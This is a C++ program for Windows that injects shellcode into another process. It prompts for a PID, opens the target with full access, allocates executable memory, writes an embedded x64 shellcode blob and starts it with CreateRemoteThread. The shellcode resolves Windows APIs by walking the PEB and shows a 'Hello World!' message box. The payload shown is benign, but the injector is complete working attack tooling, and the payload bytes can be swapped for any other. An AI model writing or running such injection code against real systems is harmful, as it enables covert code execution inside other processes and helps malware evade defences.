#include "Windows.h"
#include <iostream>
#include <string>


int main()
{
	unsigned char shellcode[] = "\x56\x48\x8B\xF4\x48\x83\xE4\xF0\x48\x83\xEC\x20\xE8\x05\x00\x00"
		"\x00\x48\x8B\xE6\x5E\xC3\x48\x81\xEC\xF8\x00\x00\x00\xB8\x6B\x00"
		"\x00\x00\x66\x89\x44\x24\x70\xB8\x65\x00\x00\x00\x66\x89\x44\x24"
		"\x72\xB8\x72\x00\x00\x00\x66\x89\x44\x24\x74\xB8\x6E\x00\x00\x00"
		"\x66\x89\x44\x24\x76\xB8\x65\x00\x00\x00\x66\x89\x44\x24\x78\xB8"
		"\x6C\x00\x00\x00\x66\x89\x44\x24\x7A\xB8\x33\x00\x00\x00\x66\x89"
		"\x44\x24\x7C\xB8\x32\x00\x00\x00\x66\x89\x44\x24\x7E\xB8\x2E\x00"
		"\x00\x00\x66\x89\x84\x24\x80\x00\x00\x00\xB8\x64\x00\x00\x00\x66"
		"\x89\x84\x24\x82\x00\x00\x00\xB8\x6C\x00\x00\x00\x66\x89\x84\x24"
		"\x84\x00\x00\x00\xB8\x6C\x00\x00\x00\x66\x89\x84\x24\x86\x00\x00"
		"\x00\x33\xC0\x66\x89\x84\x24\x88\x00\x00\x00\x48\x8D\x4C\x24\x70"
		"\xE8\x11\x05\x00\x00\x48\x89\x84\x24\xB0\x00\x00\x00\x48\x83\xBC"
		"\x24\xB0\x00\x00\x00\x00\x75\x0A\xB8\x01\x00\x00\x00\xE9\xBC\x02"
		"\x00\x00\xC6\x44\x24\x40\x4C\xC6\x44\x24\x41\x6F\xC6\x44\x24\x42"
		"\x61\xC6\x44\x24\x43\x64\xC6\x44\x24\x44\x4C\xC6\x44\x24\x45\x69"
		"\xC6\x44\x24\x46\x62\xC6\x44\x24\x47\x72\xC6\x44\x24\x48\x61\xC6"
		"\x44\x24\x49\x72\xC6\x44\x24\x4A\x79\xC6\x44\x24\x4B\x41\xC6\x44"
		"\x24\x4C\x00\x48\x8D\x54\x24\x40\x48\x8B\x8C\x24\xB0\x00\x00\x00"
		"\xE8\x71\x02\x00\x00\x48\x89\x84\x24\xB8\x00\x00\x00\x48\x83\xBC"
		"\x24\xB8\x00\x00\x00\x00\x75\x0A\xB8\x02\x00\x00\x00\xE9\x4C\x02"
		"\x00\x00\xC6\x44\x24\x50\x47\xC6\x44\x24\x51\x65\xC6\x44\x24\x52"
		"\x74\xC6\x44\x24\x53\x50\xC6\x44\x24\x54\x72\xC6\x44\x24\x55\x6F"
		"\xC6\x44\x24\x56\x63\xC6\x44\x24\x57\x41\xC6\x44\x24\x58\x64\xC6"
		"\x44\x24\x59\x64\xC6\x44\x24\x5A\x72\xC6\x44\x24\x5B\x65\xC6\x44"
		"\x24\x5C\x73\xC6\x44\x24\x5D\x73\xC6\x44\x24\x5E\x00\x48\x8D\x54"
		"\x24\x50\x48\x8B\x8C\x24\xB0\x00\x00\x00\xE8\xF7\x01\x00\x00\x48"
		"\x89\x84\x24\xC0\x00\x00\x00\x48\x83\xBC\x24\xC0\x00\x00\x00\x00"
		"\x75\x0A\xB8\x03\x00\x00\x00\xE9\xD2\x01\x00\x00\x48\x8B\x84\x24"
		"\xB8\x00\x00\x00\x48\x89\x84\x24\xD0\x00\x00\x00\x48\x8B\x84\x24"
		"\xC0\x00\x00\x00\x48\x89\x84\x24\xE0\x00\x00\x00\xC6\x44\x24\x20"
		"\x75\xC6\x44\x24\x21\x73\xC6\x44\x24\x22\x65\xC6\x44\x24\x23\x72"
		"\xC6\x44\x24\x24\x33\xC6\x44\x24\x25\x32\xC6\x44\x24\x26\x2E\xC6"
		"\x44\x24\x27\x64\xC6\x44\x24\x28\x6C\xC6\x44\x24\x29\x6C\xC6\x44"
		"\x24\x2A\x00\x48\x8D\x4C\x24\x20\xFF\x94\x24\xD0\x00\x00\x00\x48"
		"\x89\x84\x24\xD8\x00\x00\x00\xC6\x44\x24\x30\x4D\xC6\x44\x24\x31"
		"\x65\xC6\x44\x24\x32\x73\xC6\x44\x24\x33\x73\xC6\x44\x24\x34\x61"
		"\xC6\x44\x24\x35\x67\xC6\x44\x24\x36\x65\xC6\x44\x24\x37\x42\xC6"
		"\x44\x24\x38\x6F\xC6\x44\x24\x39\x78\xC6\x44\x24\x3A\x57\xC6\x44"
		"\x24\x3B\x00\x48\x8D\x54\x24\x30\x48\x8B\x8C\x24\xD8\x00\x00\x00"
		"\xFF\x94\x24\xE0\x00\x00\x00\x48\x89\x84\x24\xC8\x00\x00\x00\x48"
		"\x83\xBC\x24\xC8\x00\x00\x00\x00\x75\x0A\xB8\x04\x00\x00\x00\xE9"
		"\xFA\x00\x00\x00\xB8\x48\x00\x00\x00\x66\x89\x84\x24\x90\x00\x00"
		"\x00\xB8\x65\x00\x00\x00\x66\x89\x84\x24\x92\x00\x00\x00\xB8\x6C"
		"\x00\x00\x00\x66\x89\x84\x24\x94\x00\x00\x00\xB8\x6C\x00\x00\x00"
		"\x66\x89\x84\x24\x96\x00\x00\x00\xB8\x6F\x00\x00\x00\x66\x89\x84"
		"\x24\x98\x00\x00\x00\xB8\x20\x00\x00\x00\x66\x89\x84\x24\x9A\x00"
		"\x00\x00\xB8\x57\x00\x00\x00\x66\x89\x84\x24\x9C\x00\x00\x00\xB8"
		"\x6F\x00\x00\x00\x66\x89\x84\x24\x9E\x00\x00\x00\xB8\x72\x00\x00"
		"\x00\x66\x89\x84\x24\xA0\x00\x00\x00\xB8\x6C\x00\x00\x00\x66\x89"
		"\x84\x24\xA2\x00\x00\x00\xB8\x64\x00\x00\x00\x66\x89\x84\x24\xA4"
		"\x00\x00\x00\xB8\x21\x00\x00\x00\x66\x89\x84\x24\xA6\x00\x00\x00"
		"\x33\xC0\x66\x89\x84\x24\xA8\x00\x00\x00\xB8\x44\x00\x00\x00\x66"
		"\x89\x44\x24\x60\xB8\x65\x00\x00\x00\x66\x89\x44\x24\x62\xB8\x6D"
		"\x00\x00\x00\x66\x89\x44\x24\x64\xB8\x6F\x00\x00\x00\x66\x89\x44"
		"\x24\x66\xB8\x21\x00\x00\x00\x66\x89\x44\x24\x68\x33\xC0\x66\x89"
		"\x44\x24\x6A\x45\x33\xC9\x4C\x8D\x84\x24\x90\x00\x00\x00\x48\x8D"
		"\x54\x24\x60\x33\xC9\xFF\x94\x24\xC8\x00\x00\x00\x33\xC0\x48\x81"
		"\xC4\xF8\x00\x00\x00\xC3\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08"
		"\x48\x83\xEC\x78\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x89\x44\x24"
		"\x30\x48\x8B\x44\x24\x30\x0F\xB7\x00\x3D\x4D\x5A\x00\x00\x74\x07"
		"\x33\xC0\xE9\xFA\x01\x00\x00\x48\x8B\x44\x24\x30\x48\x63\x40\x3C"
		"\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89"
		"\x44\x24\x40\xB8\x08\x00\x00\x00\x48\x6B\xC0\x00\x48\x8B\x4C\x24"
		"\x40\x48\x8D\x84\x01\x88\x00\x00\x00\x48\x89\x44\x24\x38\x48\x8B"
		"\x44\x24\x38\x83\x38\x00\x75\x07\x33\xC0\xE9\xB2\x01\x00\x00\x48"
		"\x8B\x44\x24\x38\x8B\x00\x89\x44\x24\x18\x8B\x44\x24\x18\x48\x03"
		"\x84\x24\x80\x00\x00\x00\x48\x89\x44\x24\x10\x48\x8B\x44\x24\x10"
		"\x8B\x40\x18\x48\x89\x44\x24\x48\x48\x8B\x44\x24\x10\x8B\x40\x1C"
		"\x89\x44\x24\x24\x48\x8B\x44\x24\x10\x8B\x40\x20\x89\x44\x24\x1C"
		"\x48\x8B\x44\x24\x10\x8B\x40\x24\x89\x44\x24\x20\x48\xC7\x44\x24"
		"\x08\x00\x00\x00\x00\xEB\x0D\x48\x8B\x44\x24\x08\x48\xFF\xC0\x48"
		"\x89\x44\x24\x08\x48\x8B\x44\x24\x48\x48\x39\x44\x24\x08\x0F\x83"
		"\x3B\x01\x00\x00\x8B\x44\x24\x1C\x48\x8B\x8C\x24\x80\x00\x00\x00"
		"\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x4C\x24\x08\x48\x8D\x04\x88\x48"
		"\x89\x44\x24\x58\x8B\x44\x24\x20\x48\x8B\x8C\x24\x80\x00\x00\x00"
		"\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x4C\x24\x08\x48\x8D\x04\x48\x48"
		"\x89\x44\x24\x50\x8B\x44\x24\x24\x48\x8B\x8C\x24\x80\x00\x00\x00"
		"\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x4C\x24\x50\x0F\xB7\x09\x48\x8D"
		"\x04\x88\x48\x89\x44\x24\x60\x48\x8B\x44\x24\x58\x8B\x00\x48\x8B"
		"\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24"
		"\x28\x48\xC7\x04\x24\x00\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24\x48"
		"\xFF\xC0\x48\x89\x04\x24\x48\x8B\x04\x24\x48\x8B\x8C\x24\x88\x00"
		"\x00\x00\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85\xC0\x74\x45\x48"
		"\x8B\x04\x24\x48\x8B\x4C\x24\x28\x48\x03\xC8\x48\x8B\xC1\x0F\xBE"
		"\x00\x85\xC0\x74\x2F\x48\x8B\x04\x24\x48\x8B\x8C\x24\x88\x00\x00"
		"\x00\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x48\x8B\x0C\x24\x48\x8B"
		"\x54\x24\x28\x48\x03\xD1\x48\x8B\xCA\x0F\xBE\x09\x3B\xC1\x74\x02"
		"\xEB\x02\xEB\x97\x48\x8B\x04\x24\x48\x8B\x8C\x24\x88\x00\x00\x00"
		"\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85\xC0\x75\x2D\x48\x8B\x04"
		"\x24\x48\x8B\x4C\x24\x28\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85"
		"\xC0\x75\x17\x48\x8B\x44\x24\x60\x8B\x00\x48\x8B\x8C\x24\x80\x00"
		"\x00\x00\x48\x03\xC8\x48\x8B\xC1\xEB\x07\xE9\xA8\xFE\xFF\xFF\x33"
		"\xC0\x48\x83\xC4\x78\xC3\x48\x89\x4C\x24\x08\x48\x83\xEC\x58\x65"
		"\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x89\x44\x24\x40\x48\x8B\x44"
		"\x24\x40\x48\x8B\x40\x18\x48\x89\x44\x24\x48\x48\x8B\x44\x24\x48"
		"\x48\x83\xC0\x20\x48\x89\x44\x24\x38\x48\x8B\x44\x24\x38\x48\x8B"
		"\x00\x48\x89\x44\x24\x30\xEB\x0D\x48\x8B\x44\x24\x30\x48\x8B\x00"
		"\x48\x89\x44\x24\x30\x48\x8B\x44\x24\x38\x48\x39\x44\x24\x30\x0F"
		"\x84\xBF\x01\x00\x00\x48\x8B\x44\x24\x30\x48\x83\xE8\x10\x48\x89"
		"\x44\x24\x28\x48\x83\x7C\x24\x28\x00\x74\x0C\x48\x8B\x44\x24\x28"
		"\x48\x83\x78\x30\x00\x75\x05\xE9\x98\x01\x00\x00\x48\x8B\x44\x24"
		"\x28\x48\x8B\x40\x60\x48\x89\x44\x24\x10\x48\x83\x7C\x24\x10\x00"
		"\x75\x02\xEB\xA4\x48\xC7\x04\x24\x00\x00\x00\x00\xEB\x0B\x48\x8B"
		"\x04\x24\x48\xFF\xC0\x48\x89\x04\x24\x48\x8B\x44\x24\x28\x0F\xB7"
		"\x40\x58\x48\x39\x04\x24\x0F\x83\x26\x01\x00\x00\x48\x8B\x44\x24"
		"\x60\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x85\xC0\x74\x11\x48\x8B\x44"
		"\x24\x10\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x85\xC0\x75\x05\xE9\xFF"
		"\x00\x00\x00\x48\x8B\x44\x24\x60\x48\x8B\x0C\x24\x0F\xB7\x04\x48"
		"\x83\xF8\x5A\x7F\x47\x48\x8B\x44\x24\x60\x48\x8B\x0C\x24\x0F\xB7"
		"\x04\x48\x83\xF8\x41\x7C\x35\x48\x8B\x44\x24\x60\x48\x8B\x0C\x24"
		"\x0F\xB7\x04\x48\x83\xE8\x41\x83\xC0\x61\x89\x44\x24\x20\x48\x8B"
		"\x44\x24\x60\x48\x8B\x0C\x24\x0F\xB7\x54\x24\x20\x66\x89\x14\x48"
		"\x0F\xB7\x44\x24\x20\x66\x89\x44\x24\x08\xEB\x12\x48\x8B\x44\x24"
		"\x60\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x66\x89\x44\x24\x08\x0F\xB7"
		"\x44\x24\x08\x66\x89\x44\x24\x18\x48\x8B\x44\x24\x10\x48\x8B\x0C"
		"\x24\x0F\xB7\x04\x48\x83\xF8\x5A\x7F\x47\x48\x8B\x44\x24\x10\x48"
		"\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xF8\x41\x7C\x35\x48\x8B\x44\x24"
		"\x10\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xE8\x41\x83\xC0\x61\x89"
		"\x44\x24\x24\x48\x8B\x44\x24\x10\x48\x8B\x0C\x24\x0F\xB7\x54\x24"
		"\x24\x66\x89\x14\x48\x0F\xB7\x44\x24\x24\x66\x89\x44\x24\x0A\xEB"
		"\x12\x48\x8B\x44\x24\x10\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x66\x89"
		"\x44\x24\x0A\x0F\xB7\x44\x24\x0A\x66\x89\x44\x24\x1C\x0F\xB7\x44"
		"\x24\x18\x0F\xB7\x4C\x24\x1C\x3B\xC1\x74\x02\xEB\x05\xE9\xBC\xFE"
		"\xFF\xFF\x48\x8B\x44\x24\x60\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x85"
		"\xC0\x75\x1C\x48\x8B\x44\x24\x10\x48\x8B\x0C\x24\x0F\xB7\x04\x48"
		"\x85\xC0\x75\x0B\x48\x8B\x44\x24\x28\x48\x8B\x40\x30\xEB\x07\xE9"
		"\x24\xFE\xFF\xFF\x33\xC0\x48\x83\xC4\x58\xC3\x00\x00\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";




	std::cout << "Enter PID to inject into\n";
	std::string pid_q;
	std::cin >> pid_q;
	DWORD pid = stoi(pid_q);

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!processHandle) {
		std::cerr << "Failed to open process.\n";
		return 1;
	}

	PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!remoteBuffer) {
		std::cerr << "Failed to allocate memory in the remote process.\n";
		CloseHandle(processHandle);
		return 1;
	}

	if (!WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL)) {
		std::cerr << "Failed to write shellcode into the remote process.\n";
		VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(processHandle);
		return 1;
	}

	HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	if (!remoteThread) {
		std::cerr << "Failed to create remote thread.\n";
		VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(processHandle);
		return 1;
	}

	WaitForSingleObject(remoteThread, INFINITE);

	CloseHandle(remoteThread);
	VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
	CloseHandle(processHandle);

	std::cout << "Shellcode injected successfully.\n";

	return 0;
}